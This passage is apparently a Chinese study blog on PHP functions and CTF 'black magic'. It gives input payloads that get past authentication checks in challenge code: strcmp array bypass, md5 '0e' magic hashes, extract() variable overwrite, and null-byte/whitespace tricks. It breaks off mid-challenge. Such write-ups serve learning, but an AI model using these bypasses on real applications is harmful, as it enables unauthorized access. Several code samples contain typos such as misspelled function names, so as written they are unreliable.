class="hljs-string">&quot;变量已设置&quot;</span><br>&#125;<br><span class="hljs-comment">//结果为true，将打印文本</span><br><br><span class="hljs-comment">//使用var_dump输出isset()的返回值。</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;Mod&quot;</span><br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;Modifier&quot;</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//删除变量a</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-variable">$c</span>=<span class="hljs-literal">NULL</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$c</span>));<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示<br>变量已设置<br>bool(true)<br>bool(true)<br>bool(false)<br>bool(true)<br>bool(flase)<br></code></pre></td></tr></table></figure><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>file_get_contents() 把整个文件读入一个字符串中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contens</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">#输出演示</span><br>This <span class="hljs-keyword">is</span> an example <span class="hljs-keyword">for</span> test<br>(输出文件中的所有文本)<br></code></pre></td></tr></table></figure><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h3><p><code>strcmp()</code>把两个字符串以二进制方式进行比较，且该函数比较时区分大小写。</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><p><code>strcmp(string1, string2)</code></p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果返回值小于0，则str1小于str2;</p><p>如果返回值大于0，则str1大于str2;</p><p>如果返回值等于0，则str1等于str2;</p><blockquote><p>有资料说返回值也不仅是-1和1，也可能是其他数据</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strmp</span>(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);   <span class="hljs-comment">//输出0</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-string">&quot;Hello&quot;</span>,<span class="hljs-string">&quot;hello&quot;</span>);  <span class="hljs-comment">//输出1</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>还有个函数strcasecmp()，用法与strcmp()类似，只是不区分大小写</p></blockquote><h3 id="ereg-x2F-preg-match"><a href="#ereg-x2F-preg-match" class="headerlink" title="ereg&#x2F;preg_match"></a>ereg&#x2F;preg_match</h3><p><code>ereg()</code>和<code>preg_match()</code>是PHP中常用的正则表达式。</p><p><strong>紧急补课—正则表达式</strong></p><p>在编写处理字符串的程序或者网页的时候，经常会查找符合某些复杂规则的字符串的需要，正则表达式就是用于描述这些规则的语法。</p><p>作用： 分割， 匹配， 查找， 替换</p><p>例如： 验证邮箱地址格式， 手机号码格式等等</p><h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><p><code>preg_match(mode, string subject, array matches);</code></p><p><code>ereg(mode,string,subject,array regs);</code></p><p>mode : 正则表达式</p><p>subject : 需要验证的字符串</p><p>matches&#x2F;regs : 匹配后得到的结果，以数组的方式存储</p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>返回值是<strong>false</strong>或<strong>true</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示1：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//模式分隔符后的i标记这是一个大小写不敏感的搜索</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串&quot;</span>；<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串&quot;</span>；<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示1：<br>查找到匹配字符串<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#实例演示2：</span><br><span class="hljs-comment">//查找固定的某个单词</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is really hard!&quot;</span>))&#123;<br><span class="hljs-comment">//模式中的 \b 标记一个单词边界，所以只有独立的单词会被匹配，而不会匹配单词的部分内容 </span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串\n&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_math</span>(<span class="hljs-string">&quot;/\hard\b/i&quot;</span>,<span class="hljs-string">&quot;I think PHP is harder than others!&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;查找到匹配字符串\n&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;未发现匹配字符串\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示2：<br>查找到匹配字符串<br>未发现匹配字符串<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">#实例演示3：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 从URL中获取主机名称</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;@^(?:http://)?([^/]+)@i&#x27;</span>,<br>    <span class="hljs-string">&quot;http://shmodifier.github.io&quot;</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-variable">$host</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<br> <br><span class="hljs-comment">// 获取主机名称的后面两部分</span><br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^.]+\.[^.]+$/&#x27;</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$matches</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;domain name is: <span class="hljs-subst">&#123;$matches[0]&#125;</span>\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#输出演示3：<br>domain name is: github.io<br></code></pre></td></tr></table></figure><p><del>乱七八糟一堆符号我一个都看不懂我好得很哇</del></p><h2 id="魔法部分"><a href="#魔法部分" class="headerlink" title="魔法部分"></a>魔法部分</h2><p>警告：麻瓜请自觉退出🚫</p><h3 id="01-strcmp绕过"><a href="#01-strcmp绕过" class="headerlink" title="01 strcmp绕过"></a>01 strcmp绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midifer终将否极泰来&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>], FLAG) == <span class="hljs-number">0</span>) &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;相信我:&quot;</span> . FLAG;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ps：从ws那里copy来的（x</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>条件是<code>strcmp($_GET[&#39;flag&#39;], FLAG) == 0</code>，就是要**$_GET<strong>变量和</strong>FLAG**相等，但是我们除了严刑逼供出题人，根本就不知道FLAG是什么。</p><blockquote><p>$_GET[‘flag’]意思是从url获取一个叫flag的GET参数</p></blockquote><p>不要害怕！</p><p><strong>当 strcmp() 比较出错时会返回 NULL；而返回 NULL 即为返回 0</strong>，我们只需要palyload一个非字符串变量和字符串FLAG比较就会出错并返回0。</p><p>欸，相等辣！</p><p><strong>最终palyload</strong>： <code>?flag[]=0</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-02-28_21-02-17.png"></p><h3 id="02-md5绕过"><a href="#02-md5绕过" class="headerlink" title="02 md5绕过"></a>02 md5绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;Midifer终将否极泰来&#x27;</span>);<br> <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s1&#x27;</span>]) == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s2&#x27;</span>]) &#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;相信我 :&quot;</span> . FLAG;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>条件是<code>($_GET[&#39;s1&#39;])!=$-GET[&#39;s2&#39;] &amp;&amp; md5($GET[s1])==$_get[&#39;s2&#39;]</code>，就是变量s1和s2<strong>不能相等</strong>但是他们的<strong>md5要相等</strong>。</p><p>因为s2和s2不能相等，所以单纯md5加密得出的密文一定也不完全一样，这时就要利用一些歪门邪道<del>（不是）</del>。</p><p><strong>紧急补课—md5</strong></p><p>md5一种密码散列函数。MD5算法的原理可简要的叙述为：MD5码以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p><p><del>补不了我看不懂</del>🥲</p><h5 id="001-科学计数法绕过"><a href="#001-科学计数法绕过" class="headerlink" title="001 科学计数法绕过"></a>001 科学计数法绕过</h5><p>字符串经过md5加密后，会生成既有数字又有字母的密文，可以利用<strong>科学计数法</strong>的语法规律反推明文。</p><blockquote><p>了解到md5是不可逆的所以应该不能解码，但是可以根据加密规律找满足需要的明文</p></blockquote><p>0无论乘十的几次方都仍然为零，例如<code>&#39;0e123456&#39;==&#39;0e654321&#39;==0</code>。所以只需要找到两个经过md5加密后以<strong>”0e“</strong>开头的字符串充当变量即可。</p><p>copy了一些加密后是0e开头的值：</p><ul><li>QNKCDZO       </li><li>240610708 </li><li>s878926199a      </li><li>s155964671a         </li><li>s214587387a        </li><li>s214587387a        </li><li>0e215962017</li></ul><p><strong>最终playload</strong>：<code>?s1=QNKCDZO&amp;s2=240610708</code> </p><p>没有成功截图😣</p><p>不知道为什么自己运行的时候没成功，页面一片空白什么都没输出。</p><p><strong>紧急补课</strong></p><p>在php中，**’<em>x</em>e<em>y</em>‘** 意为x乘10的y次方。例如：1000 &#x3D;&#x3D; ‘1e3’。</p><h5 id="002-数组绕过"><a href="#002-数组绕过" class="headerlink" title="002 数组绕过"></a>002 数组绕过</h5><p>冲浪冲到的</p><p>php中的md5函数不能用来加密数组，所以会出现结果NULL。例如<code>md5([1,2]) == md5([3,4]) == NULL</code>。</p><p><strong>最终playload</strong>：<code>?s1[]=1&amp;s2[]=2</code></p><p>但是在我的电脑上复现会报错而不是直接null绕过。</p><h3 id="03-extract-变量覆盖绕过"><a href="#03-extract-变量覆盖绕过" class="headerlink" title="03 extract 变量覆盖绕过"></a>03 extract 变量覆盖绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码：</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;xxx&#x27;</span>; <br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$shiyan</span>))<br> &#123; <br>    <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shiyan</span>==<span class="hljs-variable">$content</span>)<br>    &#123; <br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Modifier终将否极泰来&#x27;</span>; <br>    &#125;<br>   <span class="hljs-keyword">else</span><br>   &#123; <br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;<br>   &#125; <br> &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目使用<code>extract($_GET)</code>接受请求，并将其键名和键值转换为变量名和变量值，随后进行if条件的判断。$flag是一个输入的变量，<code>file_get_contents($flag)</code>打开的一定是空文件，所以<code>$content</code>一定为空</p><blockquote><p>解题关键在于令$shiyan&#x3D;&#x3D;$content</p></blockquote><p>使用GET提交参数和值，利用<code>extract($_GET)</code>进行覆盖，使flag和shiyan的值都为空，从而满足if条件，输出flag。</p><p><strong>最终payload</strong>：<code>?flag=&amp;shiyan=</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-11-39.png"></p><h3 id="04-绕过过滤的空白字符"><a href="#04-绕过过滤的空白字符" class="headerlink" title="04 绕过过滤的空白字符"></a>04 绕过过滤的空白字符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-variable">$req</span> = [];<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>;<br> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_error&quot;</span>, <span class="hljs-literal">false</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br> <br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;number&#x27;</span>]))&#123;<br>   <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;</span>);<br> <br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;have a fun!!&quot;</span>);<br> <br>&#125;<br> <br><span class="hljs-keyword">foreach</span>([<span class="hljs-variable">$_GET</span>, <span class="hljs-variable">$_POST</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$global_var</span>) &#123;  <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$global_var</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>); <br>        <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-variable">$req</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$value</span>); <br>    &#125; <br>&#125; <br> <br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_palindrome_number</span>(<span class="hljs-params"><span class="hljs-variable">$number</span></span>) </span>&#123; <br>    <span class="hljs-variable">$number</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$number</span>);<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <br>    <span class="hljs-variable">$j</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$number</span>) - <span class="hljs-number">1</span>; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$j</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$number</span>[<span class="hljs-variable">$i</span>] !== <span class="hljs-variable">$number</span>[<span class="hljs-variable">$j</span>]) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>        <span class="hljs-variable">$i</span>++; <br>        <span class="hljs-variable">$j</span>--; <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>&#125; <br> <br> <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;number&#x27;</span>])) <br>&#123;<br> <br>   <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;sorry, you cann&#x27;t input a number!&quot;</span>;<br> <br>&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>]!=<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;number&#x27;</span>])))<br>&#123;<br> <br>     <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;number must be equal to it&#x27;s integer!! &quot;</span>;  <br> <br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br> <br>     <span class="hljs-variable">$value1</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]);<br>     <span class="hljs-variable">$value2</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]));  <br> <br>     <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value1</span>!=<span class="hljs-variable">$value2</span>)&#123;<br>          <span class="hljs-variable">$info</span>=<span class="hljs-string">&quot;no, this is not a palindrome number!&quot;</span>;<br>     &#125;<br>     <span class="hljs-keyword">else</span><br>     &#123;<br> <br>          <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_palindrome_number</span>(<span class="hljs-variable">$req</span>[<span class="hljs-string">&quot;number&quot;</span>]))&#123;<br>              <span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;nice! <span class="hljs-subst">&#123;$value1&#125;</span> is a palindrome number!&quot;</span>; <br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>             <span class="hljs-variable">$info</span>=<span class="hljs-variable">$flag</span>;<br>          &#125;<br>     &#125;<br> <br>&#125;<br> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$info</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>这个代码好长让我来认真看一下🧐</p><p>从最后看<code>echo $info</code>、<code>$info=$flag</code>，我们知道如果满足前面的条件，flag会被赋值给<code>$info</code>并输出。</p><p>再往上找条件</p><p>要不满足条件，即<code>is_palindrome_number($req[&quot;number&quot;])</code>为假。</p><p>前面代码有写<code>is_palindrome_number</code>函数用来判断回文数字。</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-24-52.png"></p><p>要满足<code>$value1=$value2</code>，即<code>intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))</code>，$value反转后不能和原来相等。</p><blockquote><p>strrev()函数反转字符串</p></blockquote><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-31-22.png"></p><p><code>is_numberic($REAUEST[&#39;NUMBER&#39;]</code>需要为假，且<code>$req[&#39;number&#39;]==strval(intval(eq[&#39;number&#39;])</code></p><p>再看看上面</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-52-30.png"></p><p>我们要在url传入一个名为<strong>number</strong>的变量</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_19-59-58.png"></p><p>这段的意思是把我们所有的输入收集到$global_var列表里，此时列表**$global_var&#x3D;[<em>$number</em>]<strong>。再进入下一步循环，将键名赋值给$key，变量的值赋值给$value，即</strong>$key&#x3D;0，$value&#x3D;$number**。</p><p>进入循环内部后，trim()函数去除变量首尾的空白字符或其他字符后需满足条件<code>is_string($value) &amp;&amp; $req[$key] = addslashes($value)</code>，即$value为字符串并给字符串加反斜线。</p><p>判断条件如下</p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_20-29-48.png"></p><p>综上，要传入一个字符串，字符串不能是数字还必须是整数，不是回文数字还要是回文数字😅。</p><p>悖论！<del>烦死了不做了去暴打出题人</del></p><p>没关系我们可以绕过。</p><p><code>intval()</code>和 <code>is_numeric()</code>函数在开始判断前，会先跳过所有空白字符，但是<code>is_palindrome_number()</code>不会，可以利用这个特点，在一个回文数字之前加上一个空白字符，比如<code>\f121</code>就是<code>%0c121</code></p><p>再用%00绕过<code>is_numeric($_REQUEST[&#39;number&#39;])</code></p><p><strong>最终playload</strong>：<code>?number=%00%0c121</code></p><p><img src="/img/PHP%E9%BB%91%E9%AD%94%E6%B3%95/Snipaste_2023-03-01_21-14-18.png"></p><p>这个怎么还显示代码捏</p><h3 id="05-ereg-x2F-preg-match-正则-00-截断"><a href="#05-ereg-x2F-preg-match-正则-00-截断" class="headerlink" title="05 ereg&#x2F;preg_match 正则 %00 截断"></a>05 ereg&#x2F;preg_match 正则 %00 截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#题目源代码</span><br><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <br>&#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ereg</span> (<span class="hljs-string">&quot;^[a-zA-Z0-9]+$&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) === <span class="hljs-literal">FALSE</span>)<br>  &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &lt; <span 